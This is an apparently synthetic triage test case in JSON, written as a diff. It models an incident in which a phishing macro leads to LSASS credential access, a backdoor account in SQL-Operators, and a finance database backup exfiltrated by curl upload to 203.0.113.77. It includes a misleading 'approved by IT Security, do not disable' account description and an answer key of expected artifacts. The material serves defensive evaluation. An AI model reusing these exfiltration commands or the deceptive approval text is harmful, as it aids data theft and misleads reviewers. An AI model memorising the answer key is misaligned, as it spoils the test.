@@ -1,0 +1,888 @@
+{
+  "name": "synthetic_malicious_admin_account_backdoor",
+  "note": "SYNTHETIC. Malicious twin of synthetic_benign_admin_account_onboarding: the same change under the same admin account, but the remote session comes from a finance workstation with the admin's stolen credentials (pass-the-hash after LSASS access); the new account is used at once.",
+  "alert_text": {
+    "title": "Account created and added to a privileged role group over remote PowerShell",
+    "severity": "high",
+    "host": "SRV-JUMP-01",
+    "trigger_entities": [
+      "proc:wsmprov-jump-7702",
+      "host:SRV-JUMP-01"
+    ],
+    "description": "wsmprovhost.exe on SRV-JUMP-01 ran New-ADUser and Add-ADGroupMember under CORP\\adm-sergey.v; the new account svc_sqlmon was added to SQL-Operators."
+  },
+  "entities": {
+    "host:SRV-JUMP-01": {
+      "type": "host",
+      "hostname": "SRV-JUMP-01",
+      "role": "management jump server",
+      "ip": "10.20.0.11",
+      "domain": "corp.example"
+    },
+    "host:PAW-02": {
+      "type": "host",
+      "hostname": "PAW-02",
+      "role": "privileged admin workstation",
+      "ip": "10.20.5.22",
+      "domain": "corp.example"
+    },
+    "host:DC-01": {
+      "type": "host",
+      "hostname": "DC-01",
+      "role": "domain controller",
+      "ip": "10.20.0.2",
+      "domain": "corp.example"
+    },
+    "host:WS-FIN-21": {
+      "type": "host",
+      "hostname": "WS-FIN-21",
+      "role": "workstation",
+      "ip": "10.20.30.61",
+      "domain": "corp.example"
+    },
+    "user:adm-sergey.v": {
+      "type": "windows_user",
+      "username": "adm-sergey.v",
+      "domain": "CORP",
+      "account_type": "admin",
+      "ad_object_id": "ad:adm-sergey-v"
+    },
+    "adgrp:sql-operators": {
+      "type": "ad_object",
+      "kind": "group",
+      "name": "SQL-Operators",
+      "ad_object_id": "ad:grp-sql-operators"
+    },
+    "adgrp:finance-users": {
+      "type": "ad_object",
+      "kind": "group",
+      "name": "Finance-Users",
+      "ad_object_id": "ad:grp-finance-users"
+    },
+    "proc:wsmprov-jump-3302": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\wsmprovhost.exe",
+      "cmdline": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "SRV-JUMP-01",
+      "start_time": "2026-03-09T10:15:02Z",
+      "logon_id": "0x2B77C",
+      "parent_image": "C:\\Windows\\System32\\svchost.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "cmdlet:new-aduser-3302": {
+      "type": "powershell_cmdlet_invocation",
+      "cmdlet": "New-ADUser",
+      "arguments": "-Name \"Ilya Smirnov\" -SamAccountName i.smirnov -Path \"OU=Staff,DC=corp,DC=example\" -Description \"Accountant (onboarding REQ-20877)\" -Enabled $true",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "SRV-JUMP-01",
+      "time": "2026-03-09T10:15:40Z"
+    },
+    "cmdlet:add-member-3302": {
+      "type": "powershell_cmdlet_invocation",
+      "cmdlet": "Add-ADGroupMember",
+      "arguments": "-Identity \"Finance-Users\" -Members i.smirnov",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "SRV-JUMP-01",
+      "time": "2026-03-09T10:15:52Z"
+    },
+    "user:i.smirnov": {
+      "type": "windows_user",
+      "username": "i.smirnov",
+      "domain": "CORP",
+      "account_type": "user",
+      "description": "Accountant (onboarding REQ-20877)",
+      "when_created": "2026-03-09T10:15:40Z",
+      "last_logon": "2026-03-10T08:02:11Z"
+    },
+    "proc:explorer-paw-1180": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\explorer.exe",
+      "cmdline": "C:\\Windows\\explorer.exe",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "PAW-02",
+      "start_time": "2026-03-11T09:05:20Z",
+      "logon_id": "0x3F91B",
+      "parent_image": "C:\\Windows\\System32\\userinit.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:mmc-paw-2301": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\mmc.exe",
+      "cmdline": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\dsa.msc\"",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "PAW-02",
+      "start_time": "2026-03-11T09:12:44Z",
+      "logon_id": "0x3F91B",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:edge-paw-2377": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+      "cmdline": "\"msedge.exe\" --app=https://servicedesk.corp.example/requests/REQ-20931",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "PAW-02",
+      "start_time": "2026-03-11T09:38:02Z",
+      "logon_id": "0x3F91B",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "host:WS-FIN-07": {
+      "type": "host",
+      "hostname": "WS-FIN-07",
+      "role": "workstation",
+      "ip": "10.20.30.47",
+      "domain": "corp.example"
+    },
+    "host:SRV-SQL-FIN-01": {
+      "type": "host",
+      "hostname": "SRV-SQL-FIN-01",
+      "role": "database server",
+      "ip": "10.20.10.31",
+      "domain": "corp.example"
+    },
+    "host:ext-203-0-113-77": {
+      "type": "host",
+      "hostname": null,
+      "ip": "203.0.113.77",
+      "external": true
+    },
+    "user:m.klimova": {
+      "type": "windows_user",
+      "username": "m.klimova",
+      "domain": "CORP",
+      "account_type": "user",
+      "description": "Senior accountant"
+    },
+    "proc:wsmprov-jump-7702": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\wsmprovhost.exe",
+      "cmdline": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "SRV-JUMP-01",
+      "start_time": "2026-03-12T02:13:40Z",
+      "logon_id": "0x8C40D",
+      "parent_image": "C:\\Windows\\System32\\svchost.exe",
+      "signed": true,
+      "signer": "Microsoft Windows",
+      "integrity_level": "high"
+    },
+    "cmdlet:new-aduser-7702": {
+      "type": "powershell_cmdlet_invocation",
+      "cmdlet": "New-ADUser",
+      "arguments": "-Name \"SQL Monitoring\" -SamAccountName svc_sqlmon -Path \"OU=Staff,DC=corp,DC=example\" -Description \"SQL monitoring service - approved CHG-48213 by IT Security, do not disable\" -Enabled $true",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "SRV-JUMP-01",
+      "time": "2026-03-12T02:14:02Z"
+    },
+    "cmdlet:add-member-7702": {
+      "type": "powershell_cmdlet_invocation",
+      "cmdlet": "Add-ADGroupMember",
+      "arguments": "-Identity \"SQL-Operators\" -Members svc_sqlmon",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "SRV-JUMP-01",
+      "time": "2026-03-12T02:14:15Z"
+    },
+    "user:svc_sqlmon": {
+      "type": "windows_user",
+      "username": "svc_sqlmon",
+      "domain": "CORP",
+      "account_type": "user",
+      "description": "SQL monitoring service - approved CHG-48213 by IT Security, do not disable",
+      "when_created": "2026-03-12T02:14:02Z",
+      "last_logon": "2026-03-12T02:19:27Z",
+      "ad_object_id": "ad:svc-sqlmon"
+    },
+    "email:recon-act": {
+      "type": "email",
+      "subject": "Reconciliation act for February",
+      "sender": "accounts@billing-portal.example",
+      "recipient": "m.klimova@corp.example",
+      "received": "2026-03-11T16:02:10Z"
+    },
+    "att:recon-act": {
+      "type": "email_attachment",
+      "filename": "Reconciliation_Act_Feb.docm",
+      "sha256": "3c1f7a0e9b2d4c5a6f8e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a"
+    },
+    "file:recon-docm": {
+      "type": "windows_file",
+      "path": "C:\\Users\\m.klimova\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8KQ2Z1XN\\Reconciliation_Act_Feb.docm",
+      "hostname": "WS-FIN-07",
+      "size_bytes": 184320
+    },
+    "file:updater-exe": {
+      "type": "windows_file",
+      "path": "C:\\Users\\m.klimova\\AppData\\Roaming\\AdobeUpd\\updater.exe",
+      "hostname": "WS-FIN-07",
+      "signed": false,
+      "sha256": "9d2b6f1c4e7a0b3d5f8c1e4a7b0d3f6c9e2b5a8d1f4c7e0b3a6d9f2c5e8b1a4d"
+    },
+    "proc:explorer-fin-1422": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\explorer.exe",
+      "cmdline": "C:\\Windows\\explorer.exe",
+      "user": "CORP\\m.klimova",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-11T08:55:31Z",
+      "logon_id": "0x22B70",
+      "parent_image": "C:\\Windows\\System32\\userinit.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:outlook-fin-3120": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "cmdline": "OUTLOOK.EXE",
+      "user": "CORP\\m.klimova",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-11T08:57:02Z",
+      "logon_id": "0x22B70",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "proc:excel-fin-3388": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "cmdline": "\"EXCEL.EXE\" \"\\\\SRV-FS-02\\Finance\\Reports\\AR_aging_2026-02.xlsx\"",
+      "user": "CORP\\m.klimova",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-11T10:20:15Z",
+      "logon_id": "0x22B70",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "proc:winword-fin-5990": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "cmdline": "\"WINWORD.EXE\" /n \"C:\\Users\\m.klimova\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8KQ2Z1XN\\Reconciliation_Act_Feb.docm\"",
+      "user": "CORP\\m.klimova",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-11T16:04:31Z",
+      "logon_id": "0x22B70",
+      "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "proc:upd-fin-6120": {
+      "type": "windows_process",
+      "image_path": "C:\\Users\\m.klimova\\AppData\\Roaming\\AdobeUpd\\updater.exe",
+      "cmdline": "updater.exe /s",
+      "user": "CORP\\m.klimova",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-11T16:04:55Z",
+      "logon_id": "0x22B70",
+      "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "signed": false,
+      "signer": null
+    },
+    "reg:run-adobeupd": {
+      "type": "registry_key",
+      "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "AdobeUpd",
+      "value_data": "C:\\Users\\m.klimova\\AppData\\Roaming\\AdobeUpd\\updater.exe /s",
+      "hostname": "WS-FIN-07"
+    },
+    "proc:lsass-fin-640": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\lsass.exe",
+      "cmdline": "C:\\Windows\\system32\\lsass.exe",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-09T07:01:12Z",
+      "logon_id": "0x3e7",
+      "parent_image": "C:\\Windows\\System32\\wininit.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:mmc-fin-4410": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\mmc.exe",
+      "cmdline": "\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\compmgmt.msc\"",
+      "user": "CORP\\adm-sergey.v",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-10T15:22:10Z",
+      "logon_id": "0x1F3A0",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "proc:rs-fin-6233": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell.exe -nop -w hidden -c \"Invoke-Command -ComputerName SRV-JUMP-01 -Authentication Negotiate -ScriptBlock { New-ADUser ...; Add-ADGroupMember ... }\"",
+      "user": "CORP\\m.klimova",
+      "hostname": "WS-FIN-07",
+      "start_time": "2026-03-12T02:13:30Z",
+      "logon_id": "0x9D001",
+      "parent_image": "C:\\Users\\m.klimova\\AppData\\Roaming\\AdobeUpd\\updater.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "net:winrm-fin-jump": {
+      "type": "network_connection",
+      "src_ip": "10.20.30.47",
+      "dst_ip": "10.20.0.11",
+      "dst_port": 5985,
+      "protocol": "HTTP (WinRM)",
+      "direction": "outbound"
+    },
+    "proc:sqlcmd-sql-2210": {
+      "type": "windows_process",
+      "image_path": "C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\SQLCMD.EXE",
+      "cmdline": "sqlcmd -E -Q \"BACKUP DATABASE FinLedger TO DISK=N'C:\\Windows\\Temp\\fl.bak'\"",
+      "user": "CORP\\svc_sqlmon",
+      "hostname": "SRV-SQL-FIN-01",
+      "start_time": "2026-03-12T02:21:03Z",
+      "logon_id": "0xA1190",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "signed": true,
+      "signer": "Microsoft Corporation"
+    },
+    "proc:7zr-sql-2244": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\Temp\\7zr.exe",
+      "cmdline": "7zr.exe a -mhe -pK3!x C:\\Windows\\Temp\\fl.7z C:\\Windows\\Temp\\fl.bak",
+      "user": "CORP\\svc_sqlmon",
+      "hostname": "SRV-SQL-FIN-01",
+      "start_time": "2026-03-12T02:26:40Z",
+      "logon_id": "0xA1190",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "signed": false,
+      "signer": null
+    },
+    "proc:curl-sql-2260": {
+      "type": "windows_process",
+      "image_path": "C:\\Windows\\System32\\curl.exe",
+      "cmdline": "curl.exe -k -s -T C:\\Windows\\Temp\\fl.7z https://203.0.113.77/u/",
+      "user": "CORP\\svc_sqlmon",
+      "hostname": "SRV-SQL-FIN-01",
+      "start_time": "2026-03-12T02:31:18Z",
+      "logon_id": "0xA1190",
+      "parent_image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "signed": true,
+      "signer": "Microsoft Windows"
+    },
+    "file:fl-bak": {
+      "type": "windows_file",
+      "path": "C:\\Windows\\Temp\\fl.bak",
+      "hostname": "SRV-SQL-FIN-01",
+      "size_bytes": 2210398208
+    },
+    "file:fl-7z": {
+      "type": "archive_file",
+      "path": "C:\\Windows\\Temp\\fl.7z",
+      "hostname": "SRV-SQL-FIN-01",
+      "size_bytes": 412316160
+    },
+    "file:7zr-exe": {
+      "type": "windows_file",
+      "path": "C:\\Windows\\Temp\\7zr.exe",
+      "hostname": "SRV-SQL-FIN-01",
+      "signed": false
+    },
+    "net:upload-sql-443": {
+      "type": "network_connection",
+      "src_ip": "10.20.10.31",
+      "dst_ip": "203.0.113.77",
+      "dst_port": 443,
+      "protocol": "TLS",
+      "direction": "outbound",
+      "bytes_out": 412316160
+    }
+  },
+  "relations": {
+    "rel:runs-process-01": {
+      "type": "runs_process",
+      "source": "user:adm-sergey.v",
+      "target": "proc:wsmprov-jump-3302"
+    },
+    "rel:logged-on-to-02": {
+      "type": "logged_on_to",
+      "source": "user:adm-sergey.v",
+      "target": "host:SRV-JUMP-01",
+      "logon_type": 3,
+      "auth_package": "Kerberos",
+      "source_host": "PAW-02",
+      "source_ip": "10.20.5.22",
+      "logon_id": "0x2B77C",
+      "time": "2026-03-09T10:15:01Z"
+    },
+    "rel:invoked-cmdlet-03": {
+      "type": "invoked_cmdlet",
+      "source": "proc:wsmprov-jump-3302",
+      "target": "cmdlet:new-aduser-3302"
+    },
+    "rel:invoked-cmdlet-04": {
+      "type": "invoked_cmdlet",
+      "source": "proc:wsmprov-jump-3302",
+      "target": "cmdlet:add-member-3302"
+    },
+    "rel:created-account-05": {
+      "type": "created_account",
+      "source": "user:adm-sergey.v",
+      "target": "user:i.smirnov",
+      "time": "2026-03-09T10:15:40Z",
+      "target_ou": "OU=Staff,DC=corp,DC=example",
+      "domain_controller": "DC-01"
+    },
+    "rel:added-to-group-06": {
+      "type": "added_to_group",
+      "source": "user:i.smirnov",
+      "target": "adgrp:finance-users",
+      "actor": "CORP\\adm-sergey.v",
+      "time": "2026-03-09T10:15:52Z"
+    },
+    "rel:logged-on-to-07": {
+      "type": "logged_on_to",
+      "source": "user:i.smirnov",
+      "target": "host:WS-FIN-21",
+      "logon_type": 2,
+      "auth_package": "Kerberos",
+      "time": "2026-03-10T08:02:11Z"
+    },
+    "rel:logged-on-to-08": {
+      "type": "logged_on_to",
+      "source": "user:adm-sergey.v",
+      "target": "host:PAW-02",
+      "logon_type": 2,
+      "auth_package": "Kerberos",
+      "logon_id": "0x3F91B",
+      "time": "2026-03-11T09:05:11Z"
+    },
+    "rel:runs-process-09": {
+      "type": "runs_process",
+      "source": "user:adm-sergey.v",
+      "target": "proc:explorer-paw-1180"
+    },
+    "rel:runs-process-10": {
+      "type": "runs_process",
+      "source": "user:adm-sergey.v",
+      "target": "proc:mmc-paw-2301"
+    },
+    "rel:runs-process-11": {
+      "type": "runs_process",
+      "source": "user:adm-sergey.v",
+      "target": "proc:edge-paw-2377"
+    },
+    "rel:win-process-create-12": {
+      "type": "win_process_create",
+      "source": "proc:explorer-paw-1180",
+      "target": "proc:mmc-paw-2301"
+    },
+    "rel:win-process-create-13": {
+      "type": "win_process_create",
+      "source": "proc:explorer-paw-1180",
+      "target": "proc:edge-paw-2377"
+    },
+    "rel:logged-off-from-14": {
+      "type": "logged_off_from",
+      "source": "user:adm-sergey.v",
+      "target": "host:PAW-02",
+      "logon_id": "0x3F91B",
+      "time": "2026-03-11T18:02:40Z"
+    },
+    "rel:runs-process-15": {
+      "type": "runs_process",
+      "source": "user:m.klimova",
+      "target": "proc:explorer-fin-1422"
+    },
+    "rel:runs-process-16": {
+      "type": "runs_process",
+      "source": "user:m.klimova",
+      "target": "proc:outlook-fin-3120"
+    },
+    "rel:runs-process-17": {
+      "type": "runs_process",
+      "source": "user:m.klimova",
+      "target": "proc:excel-fin-3388"
+    },
+    "rel:runs-process-18": {
+      "type": "runs_process",
+      "source": "user:m.klimova",
+      "target": "proc:winword-fin-5990"
+    },
+    "rel:runs-process-19": {
+      "type": "runs_process",
+      "source": "user:m.klimova",
+      "target": "proc:upd-fin-6120"
+    },
+    "rel:runs-process-20": {
+      "type": "runs_process",
+      "source": "user:m.klimova",
+      "target": "proc:rs-fin-6233"
+    },
+    "rel:runs-process-21": {
+      "type": "runs_process",
+      "source": "user:adm-sergey.v",
+      "target": "proc:mmc-fin-4410"
+    },
+    "rel:runs-process-22": {
+      "type": "runs_process",
+      "source": "user:adm-sergey.v",
+      "target": "proc:wsmprov-jump-7702"
+    },
+    "rel:logged-on-to-23": {
+      "type": "logged_on_to",
+      "source": "user:m.klimova",
+      "target": "host:WS-FIN-07",
+      "logon_type": 2,
+      "auth_package": "Kerberos",
+      "logon_id": "0x22B70",
+      "time": "2026-03-11T08:55:20Z"
+    },
+    "rel:logged-on-to-24": {
+      "type": "logged_on_to",
+      "source": "user:adm-sergey.v",
+      "target": "host:WS-FIN-07",
+      "logon_type": 10,
+      "auth_package": "Kerberos",
+      "source_host": "PAW-02",
+      "source_ip": "10.20.5.22",
+      "logon_id": "0x1F3A0",
+      "time": "2026-03-10T15:20:44Z"
+    },
+    "rel:received-email-25": {
+      "type": "received_email",
+      "source": "user:m.klimova",
+      "target": "email:recon-act",
+      "time": "2026-03-11T16:02:10Z"
+    },
+    "rel:contained-attachment-26": {
+      "type": "contained_attachment",
+      "source": "email:recon-act",
+      "target": "att:recon-act"
+    },
+    "rel:wrote-file-27": {
+      "type": "wrote_file",
+      "source": "proc:outlook-fin-3120",
+      "target": "file:recon-docm",
+      "time": "2026-03-11T16:04:28Z"
+    },
+    "rel:win-process-create-28": {
+      "type": "win_process_create",
+      "source": "proc:outlook-fin-3120",
+      "target": "proc:winword-fin-5990"
+    },
+    "rel:read-file-29": {
+      "type": "read_file",
+      "source": "proc:winword-fin-5990",
+      "target": "file:recon-docm"
+    },
+    "rel:wrote-file-30": {
+      "type": "wrote_file",
+      "source": "proc:winword-fin-5990",
+      "target": "file:updater-exe",
+      "time": "2026-03-11T16:04:52Z"
+    },
+    "rel:win-process-create-31": {
+      "type": "win_process_create",
+      "source": "proc:winword-fin-5990",
+      "target": "proc:upd-fin-6120"
+    },
+    "rel:executed-file-32": {
+      "type": "executed_file",
+      "source": "proc:upd-fin-6120",
+      "target": "file:updater-exe"
+    },
+    "rel:set-registry-value-33": {
+      "type": "set_registry_value",
+      "source": "proc:upd-fin-6120",
+      "target": "reg:run-adobeupd",
+      "time": "2026-03-11T16:05:03Z"
+    },
+    "rel:opened-handle-34": {
+      "type": "opened_handle",
+      "source": "proc:upd-fin-6120",
+      "target": "proc:lsass-fin-640",
+      "access_mask": "0x1410",
+      "time": "2026-03-12T02:09:12Z"
+    },
+    "rel:win-process-create-35": {
+      "type": "win_process_create",
+      "source": "proc:upd-fin-6120",
+      "target": "proc:rs-fin-6233"
+    },
+    "rel:logged-on-to-36": {
+      "type": "logged_on_to",
+      "source": "user:m.klimova",
+      "target": "host:WS-FIN-07",
+      "logon_type": 9,
+      "auth_package": "Negotiate",
+      "logon_process": "seclogo",
+      "outbound_username": "CORP\\adm-sergey.v",
+      "logon_id": "0x9D001",
+      "time": "2026-03-12T02:13:28Z"
+    },
+    "rel:connected-to-37": {
+      "type": "connected_to",
+      "source": "proc:rs-fin-6233",
+      "target": "net:winrm-fin-jump"
+    },
+    "rel:accepted-connection-from-38": {
+      "type": "accepted_connection_from",
+      "source": "proc:wsmprov-jump-7702",
+      "target": "net:winrm-fin-jump"
+    },
+    "rel:logged-on-to-39": {
+      "type": "logged_on_to",
+      "source": "user:adm-sergey.v",
+      "target": "host:SRV-JUMP-01",
+      "logon_type": 3,
+      "auth_package": "NTLM",
+      "source_host": "WS-FIN-07",
+      "source_ip": "10.20.30.47",
+      "logon_id": "0x8C40D",
+      "time": "2026-03-12T02:13:39Z"
+    },
+    "rel:invoked-cmdlet-40": {
+      "type": "invoked_cmdlet",
+      "source": "proc:wsmprov-jump-7702",
+      "target": "cmdlet:new-aduser-7702"
+    },
+    "rel:invoked-cmdlet-41": {
+      "type": "invoked_cmdlet",
+      "source": "proc:wsmprov-jump-7702",
+      "target": "cmdlet:add-member-7702"
+    },
+    "rel:created-account-42": {
+      "type": "created_account",
+      "source": "user:adm-sergey.v",
+      "target": "user:svc_sqlmon",
+      "time": "2026-03-12T02:14:02Z",
+      "target_ou": "OU=Staff,DC=corp,DC=example",
+      "domain_controller": "DC-01"
+    },
+    "rel:added-to-group-43": {
+      "type": "added_to_group",
+      "source": "user:svc_sqlmon",
+      "target": "adgrp:sql-operators",
+      "actor": "CORP\\adm-sergey.v",
+      "time": "2026-03-12T02:14:15Z"
+    },
+    "rel:logged-on-to-44": {
+      "type": "logged_on_to",
+      "source": "user:svc_sqlmon",
+      "target": "host:SRV-SQL-FIN-01",
+      "logon_type": 3,
+      "auth_package": "NTLM",
+      "source_host": "WS-FIN-07",
+      "source_ip": "10.20.30.47",
+      "logon_id": "0xA1190",
+      "time": "2026-03-12T02:19:27Z"
+    },
+    "rel:runs-process-45": {
+      "type": "runs_process",
+      "source": "user:svc_sqlmon",
+      "target": "proc:sqlcmd-sql-2210"
+    },
+    "rel:runs-process-46": {
+      "type": "runs_process",
+      "source": "user:svc_sqlmon",
+      "target": "proc:7zr-sql-2244"
+    },
+    "rel:runs-process-47": {
+      "type": "runs_process",
+      "source": "user:svc_sqlmon",
+      "target": "proc:curl-sql-2260"
+    },
+    "rel:wrote-file-48": {
+      "type": "wrote_file",
+      "source": "proc:sqlcmd-sql-2210",
+      "target": "file:fl-bak"
+    },
+    "rel:executed-file-49": {
+      "type": "executed_file",
+      "source": "proc:7zr-sql-2244",
+      "target": "file:7zr-exe"
+    },
+    "rel:read-file-50": {
+      "type": "read_file",
+      "source": "proc:7zr-sql-2244",
+      "target": "file:fl-bak"
+    },
+    "rel:wrote-file-51": {
+      "type": "wrote_file",
+      "source": "proc:7zr-sql-2244",
+      "target": "file:fl-7z"
+    },
+    "rel:read-file-52": {
+      "type": "read_file",
+      "source": "proc:curl-sql-2260",
+      "target": "file:fl-7z"
+    },
+    "rel:connected-to-53": {
+      "type": "connected_to",
+      "source": "proc:curl-sql-2260",
+      "target": "net:upload-sql-443"
+    },
+    "rel:connection-to-host-54": {
+      "type": "connection_to_host",
+      "source": "net:upload-sql-443",
+      "target": "host:ext-203-0-113-77"
+    }
+  },
+  "expected": {
+    "verdict": "malicious",
+    "artifacts": [
+      {
+        "entity_id": "host:WS-FIN-07",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "user:adm-sergey.v",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "user:svc_sqlmon",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "user:m.klimova",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "file:updater-exe",
+        "kind": "file_to_delete"
+      },
+      {
+        "entity_id": "proc:upd-fin-6120",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "reg:run-adobeupd",
+        "kind": "persistence_to_remove"
+      },
+      {
+        "entity_id": "email:recon-act",
+        "kind": "mailbox_action"
+      },
+      {
+        "entity_id": "file:recon-docm",
+        "kind": "file_to_delete"
+      },
+      {
+        "entity_id": "host:SRV-SQL-FIN-01",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "file:fl-7z",
+        "kind": "file_to_delete"
+      },
+      {
+        "entity_id": "file:fl-bak",
+        "kind": "file_to_delete"
+      },
+      {
+        "entity_id": "host:ext-203-0-113-77",
+        "kind": "network_block"
+      },
+      {
+        "entity_id": "proc:wsmprov-jump-7702",
+        "kind": "process_observed"
+      },
+      {
+        "entity_id": "proc:rs-fin-6233",
+        "kind": "process_observed"
+      }
+    ],
+    "critical": [
+      {
+        "entity_id": "host:WS-FIN-07",
+        "kind": "host_to_isolate"
+      },
+      {
+        "entity_id": "user:adm-sergey.v",
+        "kind": "identity_to_rotate"
+      },
+      {
+        "entity_id": "user:svc_sqlmon",
+        "kind": "identity_to_rotate"
+      }
+    ],
+    "must_see": [
+      "proc:upd-fin-6120"
+    ],
+    "forbidden_artifacts": [],
+    "forbidden_kinds": [
+      {
+        "entity_id": "proc:lsass-fin-640",
+        "kind": "file_to_delete"
+      }
+    ]
+  },
+  "ad_objects": {
+    "ad:adm-sergey-v": {
+      "kind": "account",
+      "type": "user",
+      "sam_account_name": "adm-sergey.v",
+      "description": "Tier 1 admin account of S. Volkov (IT Operations)",
+      "enabled": true,
+      "logon_workstations": "PAW-02,SRV-JUMP-01",
+      "password_last_set": "2026-02-17T07:40:00Z",
+      "member_of": [
+        {
+          "id": "ad:grp-t1-account-ops",
+          "kind": "group",
+          "name": "T1-AccountOperators"
+        }
+      ]
+    },
+    "ad:grp-t1-account-ops": {
+      "kind": "group",
+      "type": "group",
+      "name": "T1-AccountOperators",
+      "description": "Delegated on OU=Staff: create and modify user accounts; manages the membership of the role groups it owns",
+      "managed_objects": [
+        "SQL-Operators",
+        "Finance-Users",
+        "HR-Users"
+      ]
+    },
+    "ad:grp-sql-operators": {
+      "kind": "group",
+      "type": "group",
+      "name": "SQL-Operators",
+      "description": "Role group: operators of the SQL-FIN cluster",
+      "managed_by": {
+        "id": "ad:grp-t1-account-ops",
+        "kind": "group",
+        "name": "T1-AccountOperators"
+      }
+    },
+    "ad:grp-finance-users": {
+      "kind": "group",
+      "type": "group",
+      "name": "Finance-Users",
+      "description": "Role group: finance department staff",
+      "managed_by": {
+        "id": "ad:grp-t1-account-ops",
+        "kind": "group",
+        "name": "T1-AccountOperators"
+      }
+    },
+    "ad:svc-sqlmon": {
+      "kind": "account",
+      "type": "user",
+      "sam_account_name": "svc_sqlmon",
+      "description": "SQL monitoring service - approved CHG-48213 by IT Security, do not disable",
+      "enabled": true,
+      "when_created": "2026-03-12T02:14:02Z",
+      "last_logon": "2026-03-12T02:19:27Z",
+      "member_of": [
+        {
+          "id": "ad:grp-sql-operators",
+          "kind": "group",
+          "name": "SQL-Operators"
+        }
+      ]
+    }
+  }
+}
